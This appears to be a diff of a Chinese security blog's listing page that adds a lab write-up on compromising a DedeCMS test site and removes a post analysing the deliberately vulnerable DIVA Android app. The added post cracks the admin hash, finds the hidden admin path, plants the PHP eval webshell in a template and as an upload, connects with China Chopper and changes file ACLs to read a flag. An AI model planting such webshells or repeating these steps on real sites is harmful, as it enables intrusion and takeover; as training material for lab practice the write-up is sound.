@@ -150,6 +150,136 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-web渗透入门之-真的很简单" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/12/web渗透入门之-真的很简单/">web渗透入门之-真的很简单</a>
+    </h1>
+  
+
+        
+        <a href="/2018/10/12/web渗透入门之-真的很简单/" class="archive-article-date">
+  	<time datetime="2018-10-12T07:46:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-网站管理员的密码是多少？"><a href="#0x01-网站管理员的密码是多少？" class="headerlink" title="0x01 网站管理员的密码是多少？"></a>0x01 网站管理员的密码是多少？</h1><p>在实验环境内根据提示打开下载链接 <code>http://file.ichunqiu.com/49ba59ab</code>，接着下载爆破工具 <code>dedecms.exe</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/1.png" alt="dedecms_download"></p>
+<p>打开工具，输入目标 URL，一键爆破得到管理员的账号 <code>ichunqiu</code> 与密码哈希值 <code>adab29e084ff095ce3eb</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/2" alt="dedecms"></p>
+<p>仔细数数，发现密码哈希值是 20 位的（注：此处的“位”均为十六进制，而非二进制），上网一查才发现这是织梦 CMS 的特性，实现过程可参考 <a href="http://www.jb51.net/cms/104721.html" target="_blank" rel="noopener">DEDECMS的20位MD5加密密文解密示例介绍</a>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/3.png" alt="dedecms_md5"></p>
+<p>将 20 位的哈希值用 <a href="http://www.dmd5.com/md5-decrypter.jsp" target="_blank" rel="noopener">MD5解密工具</a> 解密，得到密码明文 <code>only_system</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/4.png" alt="password"></p>
+<p>为验证 20 位的 MD5 哈希算法规则，可进一步用 <a href="https://md5jiami.51240.com/" target="_blank" rel="noopener">MD5加密工具</a> 对 <code>only_system</code> 加密，发现其 16 位哈希值确实能由 20 位哈希值去掉前 3 位与后 1 位所得:</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/5.png" alt="password_verify"></p>
+<h1 id="0x02-网站后台目录名是什么？"><a href="#0x02-网站后台目录名是什么？" class="headerlink" title="0x02 网站后台目录名是什么？"></a>0x02 网站后台目录名是什么？</h1><p>第 2 题上来先尝试织梦 CMS 的默认后台路径 <code>/dede/index.php</code> 或 <code>/dede/login.php</code>，得到 404 的结果也是意料之中，即现在的问题是要找出修改后的后台目录名。</p>
+<p>打开实验工具箱，发现【目录扫描】文件夹，以【御剑后台扫描工具】为例，对目标 URL 扫描后得到如下结果：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/6.png" alt="directory_scan"></p>
+<p>注意，为了保证扫描效率，一般后台扫描工具都是采用字典扫描，而不是暴力穷举，因此<strong>不同扫描器得到的结果不完全相同，尽可能使用多种扫描器，偏僻怪异的名字可能扫描不出来</strong>。</p>
+<p>笔者采用了多种扫描器，并对其可能的结果进行验证，都一无所获，即可<strong>判断此后台目录名具有较强的个性或随机性</strong>。</p>
+<p>所以要转换思路，看看织梦 CMS 是否存在后台地址信息泄露的漏洞。果不其然，发现从报错文件 <code>/data/mysql_error_trace.inc</code> 或 <code>/data/mysqli_error_trace.inc</code> 中，可得到泄露的后台路径，具体可参考：</p>
+<blockquote>
+<p><a href="http://blog.csdn.net/wangyi_lin/article/details/9286937" target="_blank" rel="noopener">dedecms的各种卡哇伊小漏洞</a><br><a href="http://www.cnblogs.com/hookjoy/p/6996820.html" target="_blank" rel="noopener">dedecms(织梦)漏洞&amp;exp整理</a><br><a href="http://www.daixiaorui.com/read/14.html" target="_blank" rel="noopener">php学习之织梦dedecms漏洞讲解</a></p>
+</blockquote>
+<p>最后在 <code>/data/mysqli_error_trace.inc</code> 中获得后台目录名为 <code>lichunqiul</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/7.png" alt="mysqli_error_trace"></p>
+<p>对其进行验证，终于看到了后台登录页面：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/8.png" alt="login"></p>
+<h1 id="0x03-管理员桌面中-flag-文件信息是？"><a href="#0x03-管理员桌面中-flag-文件信息是？" class="headerlink" title="0x03 管理员桌面中 flag 文件信息是？"></a>0x03 管理员桌面中 flag 文件信息是？</h1><p>用账号 <code>ichunqiu</code> 与密码 <code>only_system</code> 登录后台后，根据实验手册，要想办法利用<a href="http://www.zhongguocaidao.com/" target="_blank" rel="noopener">中国菜刀</a>连接服务器，获得 webshell，进而查看 flag 文件中的信息。</p>
+<h2 id="获取-webshell"><a href="#获取-webshell" class="headerlink" title="获取 webshell"></a>获取 webshell</h2><p>首先我们需要在服务器插入<a href="https://baike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">一句话木马</a>，然后才能用菜刀连接，获得 webshell。这里介绍两种插入一句话木马的方法。</p>
+<h3 id="直接修改模板-PHP-源码"><a href="#直接修改模板-PHP-源码" class="headerlink" title="直接修改模板 PHP 源码"></a>直接修改模板 PHP 源码</h3><p>依次点击 <strong>模板 -&gt; 标签源码管理</strong>，以编辑第一个模板 <code>adminname.lib.php</code> 为例：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/9.png" alt="template_list"></p>
+<p>在模板源码第一行插入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/10.png" alt="template_edit"></p>
+<p>接着在工具箱【webshell】文件夹打开【中国菜刀】：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/11.png" alt="chopper"></p>
+<p>在 <strong>添加SHELL</strong> 输入框中，输入被插入木马模板文件的地址 <code>http://www.test.ichunqiu/include/taglib/adminname.lib.php</code>，其右侧填入木马中接收 POST 请求数据的 key 字段 <code>cmd</code>，脚本类型为 <code>PHP(Eval)</code>，字符编码为 <code>GB2312</code>，设置完成后点击 <strong>添加</strong>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/12.png" alt="add_shell_1"></p>
+<p>若参数设置正确，双击所添加的条目，即可连接服务器的资源管理器，进入到模板文件所在的目录：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/13.png" alt="manager_1"></p>
+<h3 id="上传一句话木马文件"><a href="#上传一句话木马文件" class="headerlink" title="上传一句话木马文件"></a>上传一句话木马文件</h3><p>先在本地创建文件 <code>trojan.php</code>，写入一句话木马 <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/14.png" alt="trojan_edit"></p>
+<p>再依次点击 <strong>系统 -&gt; 系统基本参数 -&gt; 附件设置</strong>，如下图更改允许上传的文件类型，否则木马将上传失败：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/15.png" alt="file_type"></p>
+<p>最后点击 <strong>核心 -&gt; 上传新文件</strong>，如下图所示上传木马：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/16.png" alt="trojan_upload"></p>
+<p>上传完毕后点击 <strong>核心 -&gt; 附件数据管理 -&gt; 更改</strong>，即可查看木马的路径：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/17.png" alt="trojan_path"></p>
+<p>接着利用菜刀添加SHELL，步骤同上，只不过地址更改为 <code>http://www.test.ichunqiu/uploads/soft/180307/1_1503138291.php</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/18.png" alt="add_shell_2"></p>
+<p>若参数设置正确，双击连接服务器的资源管理器，即可进入到木马所上传的目录：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/19.png" alt="manager_2"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进入到管理员桌面可看到 flag 文件 <code>flag~ichunqiu.txt</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/20.png" alt="manager_flag"></p>
+<p>但双击后未显示任何内容，估计是权限受限。接下来可右键点击条目，祭出虚拟终端，即 webshell 的命令行模式：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/21.png" alt="chopper_terminal"></p>
+<p>先切换至管理员桌面，用 <code>cacls</code> 命令查看 flag 文件的<a href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">访问控制列表（ACL）</a>，后用 <code>whoami</code> 命令查看用户名，发现 <code>authority\system</code> 用户对于 flag 文件的权限是 N，即无权限，用 <code>type</code> 命令查看 flag 文件果然是拒绝访问的：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/22.png" alt="deny"></p>
+<p>用 <code>cacls</code> 命令更改了访问权限后，<code>authority\system</code> 用户对于 flag 文件的权限变成了 F，即所有权限，再次查看 flag 文件内容即可看到 <code>key{il2o3l}</code>：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/23.png" alt="flag"></p>
+<p>注意提交答案的时候有个坑，记得先拆掉包装，只需提交 <code>il2o3l</code> 即可。最后附上 <code>cacls</code> 命令的用法：</p>
+<p><img src="/2018/10/12/web渗透入门之-真的很简单/24.png" alt="cacls"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/10/12/web渗透入门之-真的很简单/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-用python来恢复回收站中删除的项目" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1341,139 +1471,6 @@
 
 
   
-    <article id="post-Android-DIVA分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/31/Android-DIVA分析/">Android-DIVA分析</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/31/Android-DIVA分析/" class="archive-article-date">
-  	<time datetime="2018-08-31T06:41:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Android-DIVA分析"><a href="#Android-DIVA分析" class="headerlink" title="Android-DIVA分析"></a>Android-DIVA分析</h1><h3 id="1-Insecure-Logging"><a href="#1-Insecure-Logging" class="headerlink" title="1. Insecure Logging"></a>1. Insecure Logging</h3><p>主要是由于app代码中将敏感信息输出到app的logcat中，查看app记录的logcat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps| grep -i diva</span><br><span class="line">adb shell logcat | grep 1012</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2018/08/31/Android-DIVA分析/1.1.png" alt="1.1"></p>
-<p>在diva中输入数字1111222233334444 测试：输出纯文本显示应用程序的信息</p>
-<p><img src="/2018/08/31/Android-DIVA分析/1.2.png" alt="1.2"></p>
-<h3 id="2-Hardcoding-Issues"><a href="#2-Hardcoding-Issues" class="headerlink" title="2.Hardcoding Issues"></a>2.Hardcoding Issues</h3><p>使用了硬编码的方式，导致存在一定的安全风险</p>
-<p><img src="/2018/08/31/Android-DIVA分析/2.1.png" alt="2.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/2.3.png" alt="2.2"></p>
-<h3 id="3-Insecure-Data-Storage-Part1"><a href="#3-Insecure-Data-Storage-Part1" class="headerlink" title="3.Insecure Data Storage-Part1"></a>3.Insecure Data Storage-Part1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不安全的数据存储也是App常见的安全问题之一，主要有三种方式：</span><br><span class="line">1，将敏感数据保存到配置文件中；</span><br><span class="line">2，将敏感数据保存在本地的sqlite3数据库中；</span><br><span class="line">3，将敏感数据保存在临时文件或者sd卡中。</span><br></pre></td></tr></table></figure>
-<p>源码：InsecureDataStorage1Activity</p>
-<p><img src="/2018/08/31/Android-DIVA分析/3.1.png" alt="3.1"></p>
-<p>去<code>/data/data/jakhar.aseem.diva</code>（包的名称）  <strong>shared_prefs</strong>  文件夹中找到：-检查内容：-打开.xml文件，找到用户先前引入的凭据：SharedPreferences类存储的数据会以.xml的形式存储在<code>/data/data/apppackagename/shared_prefs</code></p>
-<p><img src="/2018/08/31/Android-DIVA分析/3.2.png" alt="3.2"></p>
-<h3 id="4-Insecure-Data-Storage-Part2"><a href="#4-Insecure-Data-Storage-Part2" class="headerlink" title="4.Insecure Data Storage-Part2"></a>4.Insecure Data Storage-Part2</h3><p>用户的敏感信息存储到本地的数据库中，一般app对应的数据库目录:<code>/data/data/apppackagename/databases</code></p>
-<p><img src="/2018/08/31/Android-DIVA分析/4.1.png" alt="4.1"></p>
-<p> 打开文件夹，有许多不同的数据库。</p>
-<p>我们可以尝试其中任何一个，直到找到有趣的信息 但是，为了简单起见，我们直接转到ids2：- Android使用  <strong>sqlite</strong>  数据库管理系统：- ids2数据库中有2个表：- 从表myuser中选择所有内容，我们找到用户引入的凭据</p>
-<h3 id="5-Insecure-Data-Storage-Part3"><a href="#5-Insecure-Data-Storage-Part3" class="headerlink" title="5.Insecure Data Storage-Part3"></a>5.Insecure Data Storage-Part3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/jakhar.aseen.diva/零时数据 uinfotemp</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/31/Android-DIVA分析/5.1.png" alt="5.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/5.2.png" alt="5.2"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/5.3.png" alt="5.3"></p>
-<h3 id="6-Insecure-Data-Storage-Part4"><a href="#6-Insecure-Data-Storage-Part4" class="headerlink" title="6.Insecure Data Storage-Part4"></a>6.Insecure Data Storage-Part4</h3><p>原目录查看，<code>InsecureDataStorage4Activity</code> 发现函数<code>getExternalStorageDirectory()</code>及uinfo.txt</p>
-<p><img src="/2018/08/31/Android-DIVA分析/6.1.png" alt="6.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/6.2.png" alt="6.2"></p>
-<h3 id="7-Input-Validation-Issues-Part1"><a href="#7-Input-Validation-Issues-Part1" class="headerlink" title="7.Input Validation Issues-Part1"></a>7.Input Validation Issues-Part1</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SQLInjectionActivity</span></span><br><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SQLInjectionActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mDB = openOrCreateDatabase(<span class="string">"sqli"</span>, MODE_PRIVATE, <span class="keyword">null</span>);</span><br><span class="line">            mDB.execSQL(<span class="string">"DROP TABLE IF EXISTS sqliuser;"</span>);</span><br><span class="line">            mDB.execSQL(<span class="string">"CREATE TABLE IF NOT EXISTS sqliuser(user VARCHAR, password VARCHAR, credit_card VARCHAR);"</span>);</span><br><span class="line">            mDB.execSQL(<span class="string">"INSERT INTO sqliuser VALUES ('admin', 'passwd123', '1234567812345678');"</span>);</span><br><span class="line">            mDB.execSQL(<span class="string">"INSERT INTO sqliuser VALUES ('diva', 'p@ssword', '1111222233334444');"</span>);</span><br><span class="line">            mDB.execSQL(<span class="string">"INSERT INTO sqliuser VALUES ('john', 'password123', '5555666677778888');"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">"Diva-sqli"</span>, <span class="string">"Error occurred while creating database for SQLI: "</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        setContentView(R.layout.activity_sqlinjection);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">search</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        EditText srchtxt = (EditText) findViewById(R.id.ivi1search);</span><br><span class="line">        Cursor cr = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cr = mDB.rawQuery(<span class="string">"SELECT * FROM sqliuser WHERE user = '"</span> + srchtxt.getText().toString() + <span class="string">"'"</span>, <span class="keyword">null</span>);</span><br><span class="line">            StringBuilder strb = <span class="keyword">new</span> StringBuilder(<span class="string">""</span>);</span><br><span class="line">            <span class="keyword">if</span> ((cr != <span class="keyword">null</span>) &amp;&amp; (cr.getCount() &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">                cr.moveToFirst();</span><br><span class="line">				<span class="keyword">do</span> &#123;</span><br><span class="line">                    strb.append(<span class="string">"User: ("</span> + cr.getString(<span class="number">0</span>) + <span class="string">") pass: ("</span> + cr.getString(<span class="number">1</span>) + <span class="string">") Credit card: ("</span> + cr.getString(<span class="number">2</span>) + <span class="string">")\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">while</span> (cr.moveToNext());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                strb.append(<span class="string">"User: ("</span> + srchtxt.getText().toString() +<span class="string">") not found"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, strb.toString(), Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">"Diva-sqli"</span>, <span class="string">"Error occurred while searching in database: "</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;         </span><br><span class="line"><span class="comment">//Java源代码通知有关存储用户凭据的SQLite数据库：</span></span><br><span class="line"><span class="comment">/*检查前一句，最后一个字符串由两部分组成。第一部分对应于无效用户，但它使用OR二进制操作链接到第二部分。第二部分始终为“true”（'2'='2'），因此整个字符串也是“true”（0 OR 1 = 1）。剩下的两个连字符 - 意味着连字符后的所有内容都被视为注释。*/</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/31/Android-DIVA分析/7.2.png" alt="7.2"></p>
-<h3 id="8-Input-Validation-Issues-Part2"><a href="#8-Input-Validation-Issues-Part2" class="headerlink" title="8.Input Validation Issues-Part2"></a>8.Input Validation Issues-Part2</h3><p>应用程序要求提供URL，例如<a href="http://showmeshell.top浏览器按预期打开此博客的网站：-" target="_blank" rel="noopener">http://showmeshell.top浏览器按预期打开此博客的网站：-</a> 但是，这种情况可用于使用不同的协议来利用浏览器HTTP，例如File协议，用于读取内部文件系统的内容，甚至是外部存储器中的数据。- 从上一个练习中，我们在此路径中存储了一些凭据：- 使用File protocole，可以实现对uinfo文件的访问：- 将File文件路径作为输入，显示uinfo文件的内容：- 在同样，此输入验证漏洞可用于访问外部存储上的数据。例如，假设SD卡上有一个密钥文件：Key.txt</p>
-<p><img src="/2018/08/31/Android-DIVA分析/8.1.png" alt="8.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/8.2.png" alt="8.2"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/8.3.png" alt="8.3"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/8.4.png" alt="8.4"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/8.5.png" alt="8.5"></p>
-<h3 id="9-Access-Control-Issues-Part-1"><a href="#9-Access-Control-Issues-Part-1" class="headerlink" title="9.Access Control Issues-Part 1"></a>9.Access Control Issues-Part 1</h3><p>可在AndroidManifest.xml中查看文件中暴露的activity组件</p>
-<p><img src="/2018/08/31/Android-DIVA分析/9.1.png" alt="9.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/9.2.png" alt="9.2"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/9.3.png" alt="9.3"></p>
-<h3 id="10-Access-Control-Issues-Part-2"><a href="#10-Access-Control-Issues-Part-2" class="headerlink" title="10.Access Control Issues-Part 2"></a>10.Access Control Issues-Part 2</h3><p><img src="/2018/08/31/Android-DIVA分析/10.1.png" alt="10.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/10.2.png" alt="10.2"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/10.3.png" alt="10.3"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/10.4.png" alt="10.4"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/10.5.png" alt="10.5"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/10.6.png" alt="10.6"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/10.7.png" alt="10.7"></p>
-<h3 id="11-Access-Control-Issues-Part-3"><a href="#11-Access-Control-Issues-Part-3" class="headerlink" title="11.Access Control Issues-Part 3"></a>11.Access Control Issues-Part 3</h3><p><img src="/2018/08/31/Android-DIVA分析/11.1.png" alt="11.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/11.2.png" alt="11.2"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/11.3.png" alt="11.3"></p>
-<h3 id="12-Hardcoding-Issues-2"><a href="#12-Hardcoding-Issues-2" class="headerlink" title="12.Hardcoding Issues 2"></a>12.Hardcoding Issues 2</h3><p><img src="/2018/08/31/Android-DIVA分析/12.1.png" alt="12.1"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/12.2.png" alt="12.2"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/12.3.png" alt="12.3"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/12.6.png" alt="12.6"></p>
-<p> <strong>divajni.c</strong>  保存原始C语言程序，其中供应商密钥存储为常量（<strong>#define VENDORKEY“olsdfgad; lh”</strong>），后来与函数  <strong>strncmp进行比较</strong>：最重要的结论是要记住开发人员经常将密钥硬编码到  <strong>.so</strong>  文件中</p>
-<h3 id="13-Input-Validation-Issues-3"><a href="#13-Input-Validation-Issues-3" class="headerlink" title="13.Input Validation Issues 3"></a>13.Input Validation Issues 3</h3><p>要了解应用程序内部发生的情况，检查logcat命令生成的日志非常方便。找到signal（SIGSEGV=segmentation fault ，or segmentation violation），出现内存保护的现象。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps | grep -i diva</span><br><span class="line">adb shell logcat | grep (pid)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/31/Android-DIVA分析/13.1.png" alt="13.1"></p>
-<p>找到Java source =InputValidation3Activity.java</p>
-<p><img src="/2018/08/31/Android-DIVA分析/13.2.png" alt="13.2"></p>
-<p>找到 divajni.c 找到关于CODESIZEMATX的定义， <code>app/src/main/jni</code></p>
-<p><img src="/2018/08/31/Android-DIVA分析/13.3.png" alt="13.3"></p>
-<p><img src="/2018/08/31/Android-DIVA分析/13.4.png" alt="13.4"></p>
-<p>问题函数：strcpy没有检查目标缓冲区的大小足以容纳源参数，输入超过20个数后，灰造成内存损坏或者缓冲区溢出。</p>
-<p>13个已经全部完成～</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/31/Android-DIVA分析/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
@@ -1585,11 +1582,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
